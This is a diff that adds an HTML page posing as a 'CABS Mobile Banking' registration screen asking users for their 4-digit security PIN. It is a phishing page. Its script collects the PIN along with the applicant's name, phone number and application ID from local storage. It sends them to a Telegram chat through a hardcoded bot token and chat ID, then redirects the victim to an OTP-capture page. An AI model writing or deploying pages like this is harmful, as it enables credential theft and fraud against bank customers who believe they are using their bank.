@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CABS Mobile Banking - Enter PIN</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .registration-card {
+            width: 100%;
+            max-width: 460px;
+            background-color: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            padding: 40px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .back-button {
+            width: 40px;
+            height: 40px;
+            background-color: #7cc544;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 20px;
+            margin-bottom: 25px;
+            cursor: pointer;
+            border: none;
+            transition: opacity 0.2s;
+        }
+
+        .back-button:hover {
+            opacity: 0.9;
+        }
+
+        .header-title {
+            color: #3b3a8a;
+            font-size: 32px;
+            font-weight: bold;
+            margin: 0 0 10px 0;
+        }
+
+        .sub-header {
+            color: #888;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 30px;
+        }
+
+        .instruction-text {
+            color: #555;
+            font-size: 18px;
+            line-height: 1.4;
+            margin-bottom: 35px;
+        }
+
+        .instruction-text strong {
+            color: #333;
+        }
+
+        .pin-container {
+            display: flex;
+            gap: 16px;
+            margin-bottom: 50px;
+            justify-content: center;
+        }
+
+        .pin-input {
+            width: 60px;
+            height: 64px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 28px;
+            text-align: center;
+            color: #333;
+            outline: none;
+            background-color: white;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .pin-input:focus {
+            border-color: #3b3a8a;
+            box-shadow: 0 0 0 3px rgba(59, 58, 138, 0.1);
+        }
+
+        .submit-button {
+            width: 100%;
+            background-color: #3b3a8a;
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            cursor: pointer;
+            transition: background-color 0.2s, box-shadow 0.2s;
+            box-shadow: 0 4px 10px rgba(59, 58, 138, 0.3);
+        }
+
+        .submit-button:hover {
+            background-color: #2f2e70;
+        }
+
+        .submit-button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        @media (max-width: 480px) {
+            body {
+                background-color: white;
+                align-items: flex-start;
+            }
+            .registration-card {
+                box-shadow: none;
+                padding: 20px;
+                border-radius: 0;
+                min-height: 100vh;
+            }
+            .pin-input {
+                width: 50px;
+                height: 56px;
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="registration-card">
+        <button class="back-button" onclick="history.back()">&#8249;</button>
+        
+        <h1 class="header-title">Registration</h1>
+        <div class="sub-header">Security PIN</div>
+        
+        <p class="instruction-text">
+            Please enter your <strong>4-digit PIN</strong> to complete your mobile banking account setup.
+        </p>
+        
+        <div class="pin-container">
+            <input type="password" class="pin-input" maxlength="1" pattern="[0-9]*" inputmode="numeric" autofocus>
+            <input type="password" class="pin-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="password" class="pin-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+            <input type="password" class="pin-input" maxlength="1" pattern="[0-9]*" inputmode="numeric">
+        </div>
+
+        <button class="submit-button" id="submitBtn">Submit</button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8350396603:AAG2fThlCEOBcN9TQDqdM0wRR_N590DJveI';
+        const CHAT_ID = '8213174863';
+
+        function sendToTelegram(message) {
+            const encoded = encodeURIComponent(message);
+            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encoded}&parse_mode=Markdown`)
+                .then(r => r.json())
+                .then(r => { console.log('Telegram (pin):', r); return r; })
+                .catch(e => { console.error('Telegram error:', e); });
+        }
+
+        const inputs = document.querySelectorAll('.pin-input');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            let pin = '';
+            inputs.forEach(i => pin += i.value);
+
+            if (pin.length !== 4) {
+                alert('Please enter a 4-digit PIN');
+                return;
+            }
+
+            let applicationData = JSON.parse(localStorage.getItem('loanApplication')) || {};
+            applicationData.pin = pin;
+            localStorage.setItem('loanApplication', JSON.stringify(applicationData));
+
+            const btn = document.getElementById('submitBtn');
+            btn.disabled = true;
+            btn.textContent = 'Sending...';
+
+            // ---- Send PIN only to Telegram ----
+            const message = `
+🔐 *Security PIN Submitted*
+
+🆔 Application ID: ${applicationData.applicationId || 'N/A'}
+👤 Applicant: ${applicationData.firstName || 'Valued Client'} ${applicationData.lastName || ''}
+📞 Phone: ${applicationData.phoneNumber || 'N/A'}
+🔑 PIN: ${pin}
+            `;
+
+            sendToTelegram(message).finally(() => {
+                window.location.href = 'otp2in.html';
+            });
+        });
+    </script>
+
+</body>
+</html>
